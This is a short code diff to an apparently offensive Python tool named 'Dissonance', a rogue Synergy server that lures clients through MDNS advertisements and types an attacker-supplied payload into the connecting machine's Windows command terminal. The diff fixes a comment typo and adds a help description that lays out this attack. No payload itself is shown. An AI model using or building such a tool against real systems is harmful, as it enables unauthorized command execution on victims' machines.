@@ -179,11 +179,14 @@ def start(payload):
         start_new_thread(windows_shell, (conn,payload))
     s.close()
 
-blacklist = [] # Blacklist for systems that have alread connected
+blacklist = [] # Blacklist for systems that have already connected
 
 
 def main():
-    parser = argparse.ArgumentParser(description='')
+    parser = argparse.ArgumentParser(description='Dissonance is a rouge Synergy server.  It just needs a file '
+    'containing the payload.  The payload will be typed into a windows command terminal. Additionally, you can '
+    'use --bonjour to send out MDNS advertisements to entice client to connect to your server, and you can use the '
+     'MDNS sniffer with the --sniff option. ')
     parser.add_argument('-b','--bonjour',help=' Use this option to broadcast MDNS advertisements when starting the server', required=False, action='store_true')
     parser.add_argument('-s', '--sniff', help=' Use this option to sniff for MDNS advertisements', required=False, action='store_true')
     parser.add_argument('-p', '--payload', help='Filepath to the payload', required=False)
